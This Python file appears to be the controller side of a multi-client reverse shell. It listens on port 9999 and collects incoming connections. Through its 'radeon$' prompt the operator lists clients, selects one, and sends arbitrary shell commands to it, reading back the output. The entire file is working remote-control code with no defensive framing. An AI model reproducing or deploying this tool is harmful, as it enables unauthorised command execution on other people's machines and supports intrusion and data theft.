import socket
import sys
import threading
import time
from queue import Queue 

Number_OF_THREADS=2
JOB_NUMBER=[1,2]
queue=Queue()
all_connection=[]
all_address=[]  


def create_socket():
	try:
		global host
		global port 
		global s
		host=""
		port = 9999

		s=socket.socket()
	except socket.error as mess:
		print(str(mess))
def bind_socket():
	try:
		global host
		global port 
		global s

		s.bind((host,port))
		s.listen(5)
	except socket.error as mess:
		print(mess)
		bind_socket()

#handling connection from multiple client and saving in a list

def accepting_connections():
	for i in all_connection:
		i.close()
	del all_connection[:]
	del all_address[:]

	while True:
		try:
			conn,addr=s.accept()
			s.setblocking(1)#prevents time blocking 

			all_connection.append(conn)
			all_address.append(addr)

			print("connection has been establised:"+addr[0])
		except:
			print("Error")
#Interative shell 
def start_turtle():
	while True:
		cmd=input("radeon$")
		if cmd == 'list':
			print(all_address)
			list_connection()
		elif 'select' in cmd:
			conn=get_target(cmd)
			if conn is not None:
				send_command(conn)
		else:
			print("Command not recognised")


#display all the connection
def list_connection():
	results=''
	for i,c in enumerate(all_connection):
		try:
			print("trying")
			c.send(str.encode("echo ter"))
			c.recv(4096)
		except:
			print("except")
			del all_connection[i]
			del all_address[i]
			continue
		results=str(i)+"  "+str(all_address[i][0])+" "+str(all_address[i][1]) + "\n"

	print("-------CLIENTS------ " + " \n "+ results)

#select Conection

def get_target(cmd):
	try:
		target=cmd.replace('select ','')
		target=int(target)
		#a=all_address[target]
		con=all_connection[target]
		print("target_selected",all_address[target][0])
		print(all_address[target][0],">",end="")
		return con
	except:
		print("Selection not valid")
		return None

#send command
def send_command(conn):
	while True:
		try:
			ter=input()
			if (ter =='quit'):
				exit()
			if (len(str.encode(ter))>0):
				conn.send(str.encode(ter))
				client_res=str(conn.recv(20480),'utf-8')
				print(client_res,end="")

		except:
			print("Error in sending")
			break


#creating thread 
def create_worker():
	for i in range(Number_OF_THREADS):
		t=threading.Thread(target=work)
		t.daemon =True
		t.start()

def create_job():
	for x in JOB_NUMBER:
		queue.put(x)

	queue.join()


def work():
	while True:
		x=queue.get()
		if (x==1):
			create_socket()
			bind_socket()
			accepting_connections()
		if (x==2):
			start_turtle()
		queue.task_done()


create_worker()
create_job()




























































	
